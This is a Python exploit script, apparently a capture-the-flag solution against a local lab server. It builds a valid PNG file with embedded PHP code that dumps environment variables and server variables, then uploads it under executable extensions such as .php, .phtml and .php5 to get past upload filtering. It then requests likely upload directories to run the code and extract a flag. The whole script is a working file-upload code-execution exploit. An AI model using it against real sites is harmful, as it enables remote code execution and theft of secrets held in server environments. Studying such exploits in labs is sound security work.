import requests
import io
import re

# Target URL
base_url = "http://127.0.0.1:32818"
upload_url = f"{base_url}/index.php"

# Create a minimal valid PNG with embedded PHP code
# PNG file structure:
# - PNG signature (8 bytes)
# - IHDR chunk (critical, must be first)
# - PHP code in a text chunk
# - IEND chunk (marks end)

def create_png_polyglot():
    """Create a valid PNG file with embedded PHP code"""
    
    # PNG signature (8 bytes)
    png_signature = b'\x89PNG\r\n\x1a\n'
    
    # IHDR chunk (image header - 1x1 pixel, 8-bit grayscale)
    ihdr_data = b'\x00\x00\x00\x01'  # Width: 1
    ihdr_data += b'\x00\x00\x00\x01'  # Height: 1
    ihdr_data += b'\x08'  # Bit depth: 8
    ihdr_data += b'\x00'  # Color type: grayscale
    ihdr_data += b'\x00'  # Compression: deflate
    ihdr_data += b'\x00'  # Filter: adaptive
    ihdr_data += b'\x00'  # Interlace: none
    
    # Calculate CRC for IHDR
    import zlib
    ihdr_type = b'IHDR'
    ihdr_crc = zlib.crc32(ihdr_type + ihdr_data) & 0xffffffff
    
    ihdr_chunk = len(ihdr_data).to_bytes(4, 'big')
    ihdr_chunk += ihdr_type
    ihdr_chunk += ihdr_data
    ihdr_chunk += ihdr_crc.to_bytes(4, 'big')
    
    # IDAT chunk (image data - minimal for 1x1 grayscale)
    idat_data = zlib.compress(b'\x00\x00')  # Filter none + pixel value
    idat_type = b'IDAT'
    idat_crc = zlib.crc32(idat_type + idat_data) & 0xffffffff
    
    idat_chunk = len(idat_data).to_bytes(4, 'big')
    idat_chunk += idat_type
    idat_chunk += idat_data
    idat_chunk += idat_crc.to_bytes(4, 'big')
    
    # PHP payload - extract environment variables and search for FLAG
    php_code = b'''<?php
echo "\\n=== PHP EXECUTION SUCCESSFUL ===\\n";
echo "Environment Variables:\\n";
foreach ($_ENV as $key => $value) {
    echo "$key = $value\\n";
}
echo "\\n=== Using getenv() ===\\n";
foreach (array_keys(getenv()) as $key) {
    $value = getenv($key);
    echo "$key = $value\\n";
    if (stripos($value, "FLAG") !== false) {
        echo "*** FOUND FLAG IN $key ***\\n";
    }
}
echo "\\n=== Searching \$_SERVER ===\\n";
foreach ($_SERVER as $key => $value) {
    if (is_string($value) && stripos($value, "FLAG") !== false) {
        echo "*** $key = $value ***\\n";
    }
}
echo "\\n=== All \$_SERVER vars ===\\n";
print_r($_SERVER);
?>'''
    
    # IEND chunk (end of PNG)
    iend_type = b'IEND'
    iend_crc = zlib.crc32(iend_type) & 0xffffffff
    iend_chunk = b'\x00\x00\x00\x00'  # Length: 0
    iend_chunk += iend_type
    iend_chunk += iend_crc.to_bytes(4, 'big')
    
    # Combine all parts
    polyglot = png_signature + ihdr_chunk + idat_chunk + php_code + iend_chunk
    
    return polyglot

# Create the polyglot file
polyglot_data = create_png_polyglot()
print(f"[+] Created polyglot PNG/PHP file ({len(polyglot_data)} bytes)")

# Try different filename extensions
extensions = ['.php', '.phtml', '.php5', '.png.php', '.php.png']

for ext in extensions:
    filename = f"payload{ext}"
    print(f"\n[+] Attempting upload with filename: {filename}")
    
    # Prepare multipart form data
    files = {
        'userfile': (filename, io.BytesIO(polyglot_data), 'image/png')
    }
    data = {
        'submit': 'Upload File'
    }
    
    try:
        # Upload the file
        response = requests.post(upload_url, files=files, data=data, timeout=10)
        print(f"[+] Upload Response Status: {response.status_code}")
        print(f"[+] Upload Response Length: {len(response.content)} bytes")
        
        # Check for success indicators in response
        if 'success' in response.text.lower() or 'uploaded' in response.text.lower():
            print(f"[SUCCESS] Upload appears successful!")
        
        # Print response for analysis
        print(f"[+] Upload Response:\n{response.text}")
        
        # Try to access the uploaded file to trigger PHP execution
        access_urls = [
            f"{base_url}/upload/{filename}",
            f"{base_url}/uploads/{filename}",
            f"{base_url}/uploaded/{filename}",
            f"{base_url}/files/{filename}"
        ]
        
        for access_url in access_urls:
            print(f"\n[+] Attempting to access: {access_url}")
            try:
                access_response = requests.get(access_url, timeout=10)
                print(f"[+] Access Status: {access_response.status_code}")
                print(f"[+] Access Response Length: {len(access_response.content)} bytes")
                
                if access_response.status_code == 200:
                    print(f"[+] Access Response:\n{access_response.text}")
                    
                    # Search for FLAG pattern
                    flags = re.findall(r'FLAG\{[^}]+\}', access_response.text)
                    if flags:
                        print(f"\n[!!!] FLAGS FOUND:")
                        for flag in flags:
                            print(f"[!!!] {flag}")
                    
                    # Check if PHP executed
                    if 'PHP EXECUTION SUCCESSFUL' in access_response.text:
                        print(f"\n[!!!] PHP CODE EXECUTED SUCCESSFULLY!")
                        break
                        
            except Exception as e:
                print(f"[!] Access error: {str(e)}")
        
    except Exception as e:
        print(f"[!] Upload error: {str(e)}")

print("\n[+] Testing complete")

